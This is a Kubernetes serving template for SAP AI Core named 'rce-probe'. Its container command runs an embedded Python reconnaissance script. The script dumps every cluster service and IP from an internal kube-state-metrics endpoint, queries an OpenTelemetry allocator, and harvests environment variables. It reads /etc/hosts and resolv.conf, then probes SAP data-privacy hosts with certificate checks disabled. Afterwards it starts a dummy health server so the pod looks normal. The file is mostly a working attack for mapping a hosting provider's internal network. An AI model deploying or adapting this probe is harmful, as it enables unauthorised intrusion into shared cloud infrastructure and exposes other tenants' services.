apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "59.0.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "full-svc-scan"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 << 'PYCODE'
            import urllib.request, ssl, json, re, socket

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            results = {}

            # 1. Full KSM service list — dump ALL service names/IPs
            print("[SCAN_START]")
            try:
                req = urllib.request.Request("http://100.110.128.70:8080/metrics")
                with urllib.request.urlopen(req, timeout=15) as r:
                    metrics = r.read().decode(errors='replace')
                
                # Extract all kube_service_info entries
                services = {}
                for m in re.finditer(
                    r'kube_service_info\{([^}]+)\}',
                    metrics
                ):
                    labels = {}
                    for kv in re.finditer(r'(\w+)="([^"]*)"', m.group(1)):
                        labels[kv.group(1)] = kv.group(2)
                    ns = labels.get('namespace','')
                    svc = labels.get('service','')
                    ip = labels.get('cluster_ip','')
                    key = f'{ns}/{svc}'
                    services[key] = ip
                
                # Print ALL services sorted by namespace
                print(f"TOTAL_SERVICES: {len(services)}")
                for key in sorted(services.keys()):
                    print(f"SVC: {key} -> {services[key]}")
                
                results['total_services'] = len(services)
                
                # Look for orchestration-related services
                orch_svcs = {k: v for k,v in services.items() 
                            if any(kw in k.lower() for kw in 
                                   ['orchestrat', 'ai-api', 'aicore', 'ai-core', 
                                    'llm', 'genai', 'gen-ai', 'foundation', 'ml-api',
                                    'dpi', 'privacy', 'masking', 'sap-ai'])}
                results['orchestration_related'] = orch_svcs
                print(f"\nORCH_RELATED: {json.dumps(orch_svcs, indent=2)}")
                
            except Exception as e:
                results['ksm_err'] = str(e)[:100]
                print(f"KSM_ERR: {e}")
            
            # 2. OTel TA - get scrape targets to find orchestration service pod IPs
            try:
                for otel_ep in [
                    "http://100.109.242.36:4318",
                    "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
                ]:
                    try:
                        req = urllib.request.Request(f"http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80/jobs")
                        with urllib.request.urlopen(req, timeout=5) as r:
                            jobs = json.load(r)
                        print(f"\nOTEL_JOBS: {list(jobs.keys())[:20]}")
                        results['otel_jobs'] = list(jobs.keys())[:20]
                        break
                    except Exception as e2:
                        pass
            except Exception as e:
                pass
            
            # 3. Try to reach env vars that might reveal DPI endpoint
            import os
            env_relevant = {k:v for k,v in os.environ.items() 
                          if any(kw in k.upper() for kw in 
                                 ['DPI', 'PRIVACY', 'MASKING', 'ANONYMI', 'SAP_AI',
                                  'ORCHESTRAT', 'LLM', 'AI_API', 'AICORE'])}
            results['relevant_env'] = env_relevant
            print(f"\nRELEVANT_ENV: {json.dumps(env_relevant)}")
            
            # 4. Check /etc/hosts for any DPI references
            try:
                with open('/etc/hosts') as f:
                    hosts = f.read()
                print(f"\nHOSTS: {hosts[:500]}")
            except:
                pass
            
            # 5. Check /etc/resolv.conf 
            try:
                with open('/etc/resolv.conf') as f:
                    resolv = f.read()
                print(f"\nRESOLV: {resolv}")
            except:
                pass

            # 6. Try resolving SAP external DPI hostnames
            dpi_external = [
                "dpi.sap.com",
                "api.sap.com",
                "privacy.sap.com",
                "data-privacy-integration.cfapps.eu10.hana.ondemand.com",
                "data-privacy-integration.cfapps.us10.hana.ondemand.com",
                "dpi-service.cfapps.eu10.hana.ondemand.com",
                "sap-data-privacy-integration.cfapps.eu10.hana.ondemand.com",
            ]
            for host in dpi_external:
                try:
                    ip = socket.getaddrinfo(host, None)[0][4][0]
                    print(f"\nEXT_DNS: {host} -> {ip}")
                    results[f'ext_{host}'] = ip
                    # Try HTTPS probe
                    url = f"https://{host}/api/v1"
                    req = urllib.request.Request(url, headers={"Accept": "application/json"})
                    try:
                        with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
                            body = r.read(500).decode(errors='replace')
                            print(f"  -> 200: {body[:200]}")
                    except urllib.error.HTTPError as e:
                        print(f"  -> {e.code}: {e.read(200).decode(errors='replace')[:100]}")
                    except Exception as e2:
                        print(f"  -> err: {str(e2)[:60]}")
                except:
                    pass
            
            print("\n[SCAN_END]")
            PYCODE
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
